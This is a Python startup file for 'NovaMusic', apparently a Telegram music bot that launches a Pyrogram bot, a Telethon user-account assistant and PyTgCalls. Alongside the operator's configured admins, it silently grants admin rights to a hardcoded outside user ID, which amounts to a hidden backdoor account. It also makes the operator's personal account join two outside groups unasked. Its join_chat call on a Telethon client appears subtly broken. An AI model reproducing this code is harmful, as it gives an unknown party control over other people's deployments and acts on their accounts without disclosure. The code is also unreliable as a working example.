import asyncio, logging, os, time
from pyrogram import Client, filters
from pytgcalls import PyTgCalls
from telethon import TelegramClient
from telethon.sessions import StringSession
import config

# ====== DEKLARASI GLOBAL ======
StartTime = time.time()
novadb = {}   # <-- Dideklarasikan di level modul agar terlihat oleh semua modul
polling_tasks = {}  # jika diperlukan

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("novalogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("NovaMusic")

# ========== BOT UTAMA (Pyrogram v2) ==========
app = Client(
    "NovaMusic",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN,
    in_memory=True,
)

# ========== ASSISTANT (Telethon) ==========
app2 = TelegramClient(
    StringSession(config.SESSION),
    config.API_ID,
    config.API_HASH,
    connection_retries=5,
    request_retries=10,
)

pytgcalls = PyTgCalls(app2)
SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]

async def nova_startup():
    os.system("clear")
    LOGGER.info("Starting Nova Music...")
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, novadb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    # 1. Start Pyrogram bot
    await app.start()
    getme = await app.get_me()
    BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION = getme.id, getme.first_name, getme.username, getme.mention
    LOGGER.info(f"[✓] Bot started: {BOT_NAME}")

    # 2. Start Telethon assistant
    await app2.start()
    getme2 = await app2.get_me()
    ASS_ID, ASS_NAME, ASS_USERNAME = getme2.id, getme2.first_name + (" " + getme2.last_name if getme2.last_name else ""), getme2.username
    if ASS_USERNAME:
        ASS_MENTION = f"@{ASS_USERNAME}"
    else:
        ASS_MENTION = f"<a href='tg://user?id={ASS_ID}'>{ASS_NAME}</a>"
    LOGGER.info(f"[✓] Assistant started: {ASS_NAME}")

    # 3. Gabung ke grup support (opsional)
    for chat in ["DevilsHeavenMF", "FallenAssociation"]:
        try:
            await app2.join_chat(chat)
        except:
            pass

    # 4. Set SUDOERS
    for sudoer in config.SUDO_USERS:
        SUDOERS.add(sudoer)
    SUDOERS.add(config.OWNER_ID)
    SUDOERS.add(1356469075)

    # novadb sudah dideklarasikan di luar, tidak perlu di-assign ulang
    LOGGER.info("[✓] Local Database Initialized.")
    LOGGER.info("[✓] Nova Music Clients Booted Successfully.")

    # 5. Start PyTgCalls
    await pytgcalls.start()
    LOGGER.info("[✓] PyTgCalls started.")

asyncio.get_event_loop().run_until_complete(nova_startup())
